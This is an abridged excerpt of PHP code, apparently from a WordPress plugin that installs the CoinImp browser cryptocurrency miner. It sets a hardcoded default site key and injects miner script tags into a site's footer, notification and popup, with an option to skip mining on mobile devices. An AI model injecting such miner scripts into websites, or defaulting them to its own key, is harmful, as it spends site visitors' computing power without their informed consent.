...

{
...

    {
        ...
        update_option('coinimp_defaultsitekeys', array('0671b695b001e563f34230946b071e7efa8cbf444f5ab32881d3f2746204b165',));

        if (!get_option('coinimp_previousSiteKeys')) {

            register_setting('coinimp-miner-script-installer', 'coinimp_previousSiteKeys');

            update_option('coinimp_previousSiteKeys', array('0671b695b001e563f34230946b071e7efa8cbf444f5ab32881d3f2746204b165',));
...

    {
        ...
        $footer = '<script nonce="3bd7uLRFUe8js6ZSBs6Qmw==">';
...

    {
        ...
        if (get_option('coinimp_runonmobile') == "Disabled") {
            ...
            $floatingNotification .= PHP_EOL . '<script nonce="3bd7uLRFUe8js6ZSBs6Qmw=="> if(_client.isMobile()) document.getElementById("minernotify").style.display="none"; </script>';
...

    {
        ...
        if (get_option('coinimp_runonmobile') == "Disabled") {
            ...
            $popup = str_replace(
                ...
                '<script nonce="3bd7uLRFUe8js6ZSBs6Qmw==">',

                '<script nonce="3bd7uLRFUe8js6ZSBs6Qmw==">' . PHP_EOL . 'if(! _client.isMobile()) {',
